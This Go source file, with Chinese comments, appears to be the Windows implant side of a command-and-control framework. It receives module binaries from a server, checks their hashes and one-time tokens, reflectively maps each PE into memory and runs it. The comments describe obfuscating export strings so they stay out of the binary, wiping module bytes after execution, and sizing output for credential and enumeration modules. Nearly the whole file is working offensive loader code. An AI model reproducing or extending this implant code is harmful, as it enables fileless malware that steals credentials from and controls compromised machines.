//go:build windows && execmodule

package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// ─── exec_module：内存模块按需加载（v1.4.0 S4）──────────────────────────────
//
// 这是 -tags execmodule 才编译进来的按需能力。默认载荷里**没有这个文件**，
// 由 xload_stub.go 提供"未编译此功能"的空实现 —— 默认构建因此与改动前
// 逐字节行为一致（体积也基本不变）。
//
// 完整链路（服务端 9 步校验链的植入端一侧）：
//
//	TypeModuleData 下行帧 → 按 token 暂存 + **立即校验 sha256**
//	exec_module 任务（带一次性 token）→ 按 token 取出（取出即删，一次性）
//	  → 反射映射 PE（复用 blob_windows.go 的 mapImagePE：RW 申请 → 重定位/导入
//	     表 → 按节收紧为 RX/RW，全程无 RWX）
//	  → 调 DllMain（模块自身初始化）
//	  → **版本握手**：调 tsh_module_abi()，不等即拒绝执行
//	  → 调 tsh_module_main(ctx)，ctx 在宿主分配的手工内存里
//	  → 取输出 / 错误码 → 清零并释放全部手工内存 → VirtualFree 镜像
//
// 为什么 sha256 在植入端**再算一次**（服务端已经算过）：
//   服务端校验的是"磁盘上的字节 == 清单里的字节"，植入端校验的是"**到达进程的字节**
//   == 我被授权的字节"。中间隔着压缩/加密/分帧/传输，任何一环出错（或有人能在链路上
//   改字节）都会在这里被拦下。哈希不符一律拒绝执行，没有"警告后继续"的分支。
//
// 为什么 token 取出即删：一次性凭据的语义要在**看得见字节的那一侧**也成立。
// 服务端任务重发/重放（或攻击者重放旧任务帧）时，同一个 token 第二次取不到 blob，
// 直接以 TOKEN_CONSUMED 失败 —— 不会重复执行一个有副作用的模块。

const (
	// moduleABIVersion 本宿主支持的模块 ABI 版本（与 internal/common/moduleabi.Version
	// 以及 C 头 tsh_module.h 的 TSH_MODULE_ABI_VERSION 三处必须一致）。
	//
	// 帧类型号 TypeModuleData 定义在 main.go 的协议常量块里（那里是协议的唯一出处），
	// 本文件不重复声明。
	moduleABIVersion uint32 = 1

	// moduleOutCap 宿主提供给模块的输出缓冲区容量（与 moduleabi.DefaultOutputCap 一致）。
	// 64 KiB 足够覆盖凭据/枚举类模块的文本输出；超出由模块返回 TSH_MOD_ERR_OUTPUT。
	moduleOutCap = 64 * 1024

	// moduleBlobTTL 暂存二进制的最长保留时间：任务与二进制是两次下行，极端情况下
	// 任务可能先到（见 waitModuleBlob），但不能无限期留着 —— 超时未被执行即丢弃。
	moduleBlobTTL = 3 * time.Minute

	// moduleBlobMaxKeep 最多同时暂存几份模块二进制（防"服务端一直推、植入端一直存"）。
	moduleBlobMaxKeep = 4
)

// 模块导出名（敏感字符串：与 IAT/API 名同级，走构建期字符串混淆 —— 因此必须写成
// var 而不是 const 行：混淆器按行处理，const 行会被跳过，明文就留在二进制里了）。
var (
	moduleExportABI  = "tsh_module_abi"
	moduleExportMain = "tsh_module_main"
	moduleExportErr  = "tsh_module_error"
)

// tshModuleCtx 是 tsh_module_ctx 的 Go 镜像（字段顺序与 C 头逐字段一致）。
//
// ⚠️ 与 internal/common/moduleabi.Ctx 是同一份契约的两个副本（植入端是独立 module，
// import 不到服务端包）。两边的字段顺序由单测守住（moduleabi_test.go 会解析本文件
// 与 C 头并逐字段比对）。
//
// ⚠️ 只用 ≤4 字节标量 + 指针：386 上 gcc 与 Go 对 uint64 的对齐约定不同，
// 混进 uint64 会让字段偏移在某一侧错位而编译器不报警。
type tshModuleCtx struct {
	StructSize   uint32
	ABIVersion   uint32
	SessionIDLo  uint32
	SessionIDHi  uint32
	ArgsJSON     uintptr
	ArgsLen      uint32
	Flags        uint32
	OutBuf       uintptr
	OutCap       uint32
	OutLen       uint32
	TokenFNV     uint32
	Reserved     uint32
	HostReserved uintptr
}

// moduleTaskHeader 是 exec_module 任务 Data 的 JSON（= moduleabi.ArgumentHeader）。
type moduleTaskHeader struct {
	ModuleID string `json:"module_id"`
	Token    string `json:"token"`
	SHA256   string `json:"sha256"`
	Size     int    `json:"size"`
	ABI      uint32 `json:"abi"`
	Entry    string `json:"entry,omitempty"`
	ArgsJSON string `json:"args_json,omitempty"`
}

// moduleBlobHeader 是 TypeModuleData 帧头（= moduleabi 的 blob 头）。
type moduleBlobHeader struct {
	ModuleID string `json:"module_id"`
	Token    string `json:"token"`
	SHA256   string `json:"sha256"`
	Size     int    `json:"size"`
	ABI      uint32 `json:"abi"`
}

// pendingModule 一份已到达、已校验、等待被任务取走的模块二进制。
type pendingModule struct {
	header moduleBlobHeader
	raw    []byte
	errMsg string // 非空 = 这份二进制不可用（校验失败的原因）
	at     time.Time
}

var (
	moduleBlobMu   sync.Mutex
	moduleBlobs    = map[string]*pendingModule{}
	moduleBlobSeen int
)

// handleXData 处理 TypeModuleData 下行帧：解析 → 立即校验 sha256 → 按 token 暂存。
// 它运行在协议读循环里，必须快：只做解析 + 一次 sha256（几 MB 量级在毫秒级）。
func handleXData(p *Packet) {
	if p == nil {
		return
	}
	header, blob, err := decodeModuleBlobFrame(p.Payload)
	if err != nil {
		// 帧本身不合法：记一条"最近错误"，让随后的 exec_module 任务能给出明确原因，
		// 而不是只有一句"blob missing"。
		moduleBlobMu.Lock()
		moduleBlobs[""] = &pendingModule{errMsg: fmt.Sprintf("模块下行帧不合法：%v", err), at: time.Now()}
		moduleBlobMu.Unlock()
		return
	}

	pm := &pendingModule{header: *header, at: time.Now()}
	// 哈希与大小硬校验：坏字节绝不进入"待执行"状态。
	sum := sha256.Sum256(blob)
	got := hex.EncodeToString(sum[:])
	switch {
	case len(blob) != header.Size:
		pm.errMsg = fmt.Sprintf("模块 %s 大小不符：帧头声明 %d，实际 %d", header.ModuleID, header.Size, len(blob))
	case !strings.EqualFold(got, header.SHA256):
		pm.errMsg = fmt.Sprintf("模块 %s sha256 不符：头部 %s，实际 %s（拒绝执行）",
			header.ModuleID, strings.ToLower(header.SHA256), got)
	case header.ABI != moduleABIVersion:
		pm.errMsg = fmt.Sprintf("模块 %s ABI 版本不符：模块声明 %d，宿主支持 %d",
			header.ModuleID, header.ABI, moduleABIVersion)
	default:
		pm.raw = blob
	}

	moduleBlobMu.Lock()
	moduleBlobSeen++
	// 淘汰：过期项 + 超量项（最旧优先），保证内存占用有界。
	now := time.Now()
	oldestKey, oldestAt := "", now
	for k, v := range moduleBlobs {
		if k == "" {
			continue
		}
		if now.Sub(v.at) > moduleBlobTTL {
			delete(moduleBlobs, k)
			continue
		}
		if v.at.Before(oldestAt) {
			oldestKey, oldestAt = k, v.at
		}
	}
	if _, exists := moduleBlobs[header.Token]; !exists && len(moduleBlobs) >= moduleBlobMaxKeep && oldestKey != "" {
		delete(moduleBlobs, oldestKey)
	}
	moduleBlobs[header.Token] = pm
	delete(moduleBlobs, "") // 有新的合法帧到达：清掉上一次的"帧不合法"错误
	moduleBlobMu.Unlock()
}

// takeModuleBlob 按 token 取出并**删除**待执行的模块（一次性语义，见文件头说明）。
func takeModuleBlob(token string) (*pendingModule, string) {
	moduleBlobMu.Lock()
	defer moduleBlobMu.Unlock()
	if pm, ok := moduleBlobs[token]; ok {
		delete(moduleBlobs, token)
		if pm.errMsg != "" {
			return nil, pm.errMsg
		}
		return pm, ""
	}
	if pm, ok := moduleBlobs[""]; ok {
		return nil, pm.errMsg
	}
	return nil, ""
}

// waitModuleBlob 等待二进制到达：任务与二进制是两次独立下行，任务可能先到
// （例如 WebSocket/MQTT 通道的分帧顺序、或服务端把二进制放进了下一轮心跳）。
// 只等一个有限的短窗口（8 秒），超时以明确错误失败，不无限阻塞任务 worker。
func waitModuleBlob(token string, timeout time.Duration) (*pendingModule, string) {
	deadline := time.Now().Add(timeout)
	for {
		if pm, errMsg := takeModuleBlob(token); pm != nil || errMsg != "" {
			return pm, errMsg
		}
		if time.Now().After(deadline) {
			return nil, ""
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// decodeModuleBlobFrame 解析下行帧负载：[4 字节大端 header 长度][header JSON][模块裸字节]
// （与 internal/common/moduleabi.DecodeBlobFrame 同一口径）。
func decodeModuleBlobFrame(payload []byte) (*moduleBlobHeader, []byte, error) {
	if len(payload) < 4 {
		return nil, nil, fmt.Errorf("帧只有 %d 字节", len(payload))
	}
	hlen := int(binary.BigEndian.Uint32(payload[:4]))
	if hlen <= 0 || hlen > 64*1024 || 4+hlen > len(payload) {
		return nil, nil, fmt.Errorf("帧头长度 %d 非法（负载 %d 字节）", hlen, len(payload))
	}
	var h moduleBlobHeader
	if err := json.Unmarshal(payload[4:4+hlen], &h); err != nil {
		return nil, nil, fmt.Errorf("帧头不是合法 JSON：%v", err)
	}
	if h.Token == "" {
		return nil, nil, fmt.Errorf("帧头缺少 token")
	}
	blob := payload[4+hlen:]
	if len(blob) != h.Size {
		return nil, nil, fmt.Errorf("帧内字节数 %d 与帧头声明 %d 不符", len(blob), h.Size)
	}
	return &h, blob, nil
}

// fnv1a32 计算 token 摘要（给模块做审计关联用，不暴露明文 token）。
func fnv1a32(s string) uint32 {
	var h uint32 = 2166136261
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= 16777619
	}
	return h
}

// handleXLoad 执行一个内存模块（任务入口，与其它 task 处理函数同签名）。
func handleXLoad(data string) (string, int32, string) {
	var h moduleTaskHeader
	if err := json.Unmarshal([]byte(data), &h); err != nil {
		return "", -1, fmt.Sprintf("parse exec_module data failed: %v", err)
	}
	if h.Token == "" || h.ModuleID == "" {
		return "", -1, "exec_module 任务缺少 token/module_id：模块二进制不能内联在任务里（走一次性 token）"
	}
	if h.ABI != moduleABIVersion {
		// 版本握手（任务侧）：服务端清单已经比过一次，这里比的是"任务里带的那份声明"。
		// 两次都拒，是为了让任何一侧的版本漂移都无法"加载了但行为诡异"。
		return "", -1, fmt.Sprintf("模块 %s ABI 版本不符：任务声明 %d，宿主支持 %d（拒绝执行）",
			h.ModuleID, h.ABI, moduleABIVersion)
	}
	if h.Size <= 0 || h.Size > 4*1024*1024 {
		return "", -1, fmt.Sprintf("模块 %s 声明大小 %d 不合理", h.ModuleID, h.Size)
	}

	pm, errMsg := waitModuleBlob(h.Token, 8*time.Second)
	if pm == nil {
		if errMsg == "" {
			errMsg = "模块二进制未到达（服务端未推送 TypeModuleData 帧，或该载荷未编译 execmodule 支持）"
		}
		return "", -1, fmt.Sprintf("模块 %s 无法加载：%s", h.ModuleID, errMsg)
	}
	// 帧头与任务声明必须一致：令牌把两者绑定，任何不一致都说明有人在拼不同的东西。
	if pm.header.ModuleID != h.ModuleID {
		return "", -1, fmt.Sprintf("模块 id 不一致：任务 %s，二进制帧 %s", h.ModuleID, pm.header.ModuleID)
	}
	if pm.header.SHA256 != "" && !strings.EqualFold(pm.header.SHA256, h.SHA256) {
		return "", -1, "模块 sha256 不一致：任务与二进制帧声明的不是同一份字节（拒绝执行）"
	}

	// 二次哈希校验：从暂存到执行之间也可能被改写（同进程内其它模块/调试器）。
	sum := sha256.Sum256(pm.raw)
	if got := hex.EncodeToString(sum[:]); !strings.EqualFold(got, h.SHA256) {
		return "", -1, fmt.Sprintf("模块 %s sha256 校验失败：期望 %s，实际 %s（拒绝执行）",
			h.ModuleID, strings.ToLower(h.SHA256), got)
	}

	out, code, errStr := runModuleImage(pm.raw, h.ArgsJSON, h.Token, h.ModuleID)
	// 用后即焚：二进制与暂存结构都不再需要（内容清零，避免凭据类模块的字节留在堆上）。
	for i := range pm.raw {
		pm.raw[i] = 0
	}
	pm.raw = nil

	if errStr != "" {
		return out, code, errStr
	}
	header := fmt.Sprintf("[exec_module] module=%s abi=%d token=%s size=%d sha256=ok\n",
		h.ModuleID, moduleABIVersion, h.Token[:8], h.Size)
	return header + out + "[exec_module] 镜像已释放、上下文/输出缓冲已清零\n", 0, ""
}

// runModuleImage 反射映射并执行模块镜像（核心链路）。
//
// 内存纪律：
//   - 镜像经 mapImagePE 申请（RW → 写 → 按节收紧为 RX/RW），**全程没有 RWX**；
//   - 上下文/参数/输出三块用 allocRW 申请手工内存（不放在 Go 堆上）：模块会同步读写
//     它们，若落在 Go 运行时可能移动/回收的地方，就会出现"回调期间指针失效"；
//   - 结束后输出先拷回 Go 字符串，再清零三块手工内存，最后 VirtualFree 镜像与缓冲。
//     镜像**不清零**：它的代码页是 RX，直接写会触发访问违例；敏感不在代码段，
//     交还页面即可（这也是不在映射后立刻改页保护的原因，见 protectImageSections）。
func runModuleImage(raw []byte, argsJSON, token, moduleID string) (string, int32, string) {
	base, info, err := mapImagePE(raw)
	if err != nil {
		return "", -1, fmt.Sprintf("模块反射映射失败：%v", err)
	}
	defer freeMem(base)

	// 1) 调用入口点（DllMain 约定）：给模块一次"进程附加"的机会。
	//    对 -nostdlib 的 C 模块它是空实现；对带 CRT 的模块它是初始化入口。
	if info.entryRVA != 0 {
		_, _, _ = syscall.SyscallN(base+uintptr(info.entryRVA), base, uintptr(dllProcessAttach), 0)
	}

	// 2) 版本握手：先问模块"你是哪一代 ABI"。
	abiFn, err := resolveExport(base, info, moduleExportABI)
	if err != nil {
		return "", -1, fmt.Sprintf("模块 %s 缺少 ABI 导出 %s：不是按 tsh_module.h 构建的模块（拒绝执行）",
			moduleID, moduleExportABI)
	}
	abiRet, _, _ := syscall.SyscallN(abiFn)
	if got := uint32(abiRet); got != moduleABIVersion {
		return "", -1, fmt.Sprintf("模块 %s ABI 版本不符：模块声明 %d，宿主支持 %d（拒绝执行，避免用错字段布局）",
			moduleID, got, moduleABIVersion)
	}

	mainFn, err := resolveExport(base, info, moduleExportMain)
	if err != nil {
		return "", -1, fmt.Sprintf("模块 %s 缺少入口导出 %s（拒绝执行）", moduleID, moduleExportMain)
	}

	// 3) 准备上下文（手工内存）。
	ctxSize := unsafe.Sizeof(tshModuleCtx{})
	ctxBase, _, err := allocRW(ctxSize)
	if err != nil {
		return "", -1, fmt.Sprintf("分配模块上下文失败：%v", err)
	}
	defer func() {
		zeroMemRange(ctxBase, ctxSize)
		freeMem(ctxBase)
	}()

	argsBase, _, err := allocRW(uintptr(len(argsJSON) + 1))
	if err != nil {
		return "", -1, fmt.Sprintf("分配模块参数缓冲失败：%v", err)
	}
	defer func() {
		zeroMemRange(argsBase, uintptr(len(argsJSON)+1))
		freeMem(argsBase)
	}()
	if len(argsJSON) > 0 {
		copy((*[1 << 20]byte)(unsafe.Pointer(argsBase))[:len(argsJSON)], []byte(argsJSON))
	}
	(*[1 << 20]byte)(unsafe.Pointer(argsBase))[len(argsJSON)] = 0

	outBase, _, err := allocRW(moduleOutCap)
	if err != nil {
		return "", -1, fmt.Sprintf("分配模块输出缓冲失败：%v", err)
	}
	defer func() {
		zeroMemRange(outBase, moduleOutCap)
		freeMem(outBase)
	}()

	ctx := (*tshModuleCtx)(unsafe.Pointer(ctxBase))
	ctx.StructSize = uint32(ctxSize)
	ctx.ABIVersion = moduleABIVersion
	ctx.SessionIDLo = uint32(sessionID)
	ctx.SessionIDHi = uint32(sessionID >> 32)
	ctx.ArgsJSON = argsBase
	ctx.ArgsLen = uint32(len(argsJSON))
	ctx.Flags = 0
	ctx.OutBuf = outBase
	ctx.OutCap = moduleOutCap
	ctx.OutLen = 0
	ctx.TokenFNV = fnv1a32(token)
	ctx.Reserved = 0
	ctx.HostReserved = 0

	// 4) 同步调用模块入口。返回值 = 错误类别（0 成功，负数见 tsh_module.h）。
	ret, _, _ := syscall.SyscallN(mainFn, ctxBase)

	outLen := ctx.OutLen
	if outLen > moduleOutCap {
		outLen = moduleOutCap
	}
	out := ""
	if outLen > 0 {
		out = string((*[moduleOutCap]byte)(unsafe.Pointer(outBase))[:outLen])
	}

	if int32(ret) != 0 {
		detail := moduleCodeMessage(int32(ret))
		// 可选导出 tsh_module_error()：模块自己的错误串（比返回码更具体）。
		if errFn, e := resolveExport(base, info, moduleExportErr); e == nil {
			if p, _, _ := syscall.SyscallN(errFn); p != 0 && p >= base {
				if msg := cstringAt(base, uint32(p-base)); msg != "" {
					detail = msg
				}
			}
		}
		return out, -1, fmt.Sprintf("模块 %s 执行失败（返回码 %d）：%s", moduleID, int32(ret), detail)
	}
	return out, 0, ""
}

// moduleCodeMessage 把模块返回码翻译成中文说明。
//
// 这份表与 internal/common/moduleabi.CodeMessage 是同一份契约的两个副本
// （植入端是独立 module，import 不到服务端包）。模块返回负数是"错误类别"，
// 不是 errno —— 这样宿主不必解析模块自己的输出就能给出稳定分类。
func moduleCodeMessage(code int32) string {
	switch code {
	case 0:
		return "成功"
	case -1:
		return "模块 ABI 版本不符或缺少 tsh_module_abi 导出"
	case -2:
		return "模块参数不合法（args 解析失败或缺少必需字段）"
	case -3:
		return "模块执行前提不满足（权限/平台/依赖）"
	case -4:
		return "模块输出超出宿主提供的缓冲区上限"
	case -5:
		return "模块内部异常（已由模块自身捕获）"
	case -6:
		return "宿主侧错误（PE 映射/导出解析/完整性校验失败）"
	default:
		return fmt.Sprintf("未知模块返回码 %d", code)
	}
}
